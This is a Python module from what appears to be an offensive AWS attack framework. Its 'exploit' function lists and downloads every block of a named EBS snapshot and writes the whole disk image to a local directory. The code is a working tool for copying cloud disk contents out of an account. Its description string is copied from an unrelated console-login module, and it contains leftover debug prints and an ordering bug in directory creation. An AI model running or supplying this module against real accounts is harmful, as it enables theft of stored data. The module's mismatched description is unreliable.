import os

author = {
    "name": "gl4ssesbo1",
    "twitter": "https://twitter.com/gl4ssesbo1",
    "github": "https://github.com/gl4ssesbo1",
    "blog": "https://www.pepperclipp.com/"
}

needs_creds = True

variables = {
    "SERVICE": {
        "value": "ebs",
        "required": "true",
        "description": "The service that will be used to run the module. It cannot be changed."
    },
    "SNAPSHOT-ID": {
        "value": "",
        "required": "true",
        "description": " The ID of the snapshot to download."
    },
    "OUTPUT-DIRECTORY": {
        "value": "/tmp/snapshots",
        "required": "true",
        "description": 'The directory to store the snapshot files'
    },
    "BLOCK-INDEX": {
        "value": "",
        "required": "false",
        "description": 'The index of the snapshot that will be downloaded. If this is not added, ebs:ListSnapshotBlocks will be executed and all indexes will be downloaded. If this is set and BLOCK-TOKEN is not set, ebs:ListSnapshotBlocks will be executed to find the token of the index.'
    },
    "BLOCK-TOKEN": {
        "value": "",
        "required": "false",
        "description": 'The token of the block that will be downloaded. If this is not set, ebs:ListSnapshotBlocks will be executed to get the token of the index.'
    }
}
description = "This module is based of aws_consoler from NetSPI. It will run STS:GetFederationToken to create a set of temporary credentials for the user and then try to create a console that allows access even if the user no login profile."

aws_command = ""

calls = [
    "ebs:ListSnapshotBlocks",
    "ebs:GetSnapshotBlock"
]

def exploit(profile, workspace):
    try:
        snapshotID = variables['SNAPSHOT-ID']['value']
        outputDir = variables['OUTPUT-DIRECTORY']['value']
        blockIndex = variables['BLOCK-INDEX']['value']
        blockToken = variables['BLOCK-TOKEN']['value']

        print("1")

        blockIndexes = []
        if blockIndex != "":
            if blockToken != "":
                blockIndexes = [
                    {
                        "BlockIndex": blockIndex,
                        "BlockToken": blockToken
                    }
                ]
            else:
                blockIndexes = []
                result = profile.list_snapshot_blocks(
                    SnapshotId=snapshotID
                )
                secrets = result['Blocks']

                while "NextToken" in result and result['NextToken'] != "":
                    result = profile.list_snapshot_blocks(
                        SnapshotId=snapshotID,
                        NextToken=result['NextToken']
                    )
                    secrets.extend(result['Blocks'])

                for ressecret in secrets:
                    if ressecret['BlockIndex'] == blockIndex:
                        blockIndexes = [
                            {
                                "BlockIndex": blockIndex,
                                "BlockToken": ressecret['BlockToken']
                            }
                        ]
                        break

        else:
            result = profile.list_snapshot_blocks(
                SnapshotId=snapshotID
            )
            blockIndexes = result['Blocks']

            while "NextToken" in result and result['NextToken'] != "":
                result = profile.list_snapshot_blocks(
                    SnapshotId=snapshotID,
                    NextToken=result['NextToken']
                )
                blockIndexes.extend(result['Blocks'])

        print("2")
        returndict = []
        with open(f"{outputDir}/{snapshotID}", "ab") as biFile:
            for blockIndexValue in blockIndexes:
                try:
                    secretValueReq = profile.get_snapshot_block(
                        SnapshotId=snapshotID,
                        BlockIndex=blockIndexValue['BlockIndex'],
                        BlockToken=blockIndexValue['BlockToken']
                    )

                    if 'BlockData' in secretValueReq:
                        if not os.path.exists(outputDir):
                            os.mkdir(outputDir)

                        biFile.write(secretValueReq['BlockData'].read())

                        returndict.append(
                            {
                                "BlockIndex": blockIndexValue['BlockIndex'],
                                'Downloaded': True
                            }
                        )

                except Exception as e:
                    print(str(e))
                    returndict.append(
                        {
                            "BlockIndex": blockIndexValue['BlockIndex'],
                            'Downloaded': False,
                            "Error": str(e)
                        }
                    )
        print("3")
        '''
        database_data = {
            "aws_username": user['UserName'],
            "aws_user_arn": user['Arn'],
            "aws_user_id": user['UserId'],
            "aws_user_create_date": user['CreateDate'],
            "aws_account_id": user['Arn'].split(":")[4]
        }

        try:
            aws_user = AWSUsers.objects.get(aws_username=user['UserName'])
            aws_user.modify(**database_data)
            aws_user.save()

        except DoesNotExist:
            AWSUsers(**database_data).save()

        except Exception as e:
            return {"error": "Error from module: {}".format(str(e))}, 500
        '''
        return {"BlockIndex": returndict}

    except Exception as e:
        return {"error": str(e)}
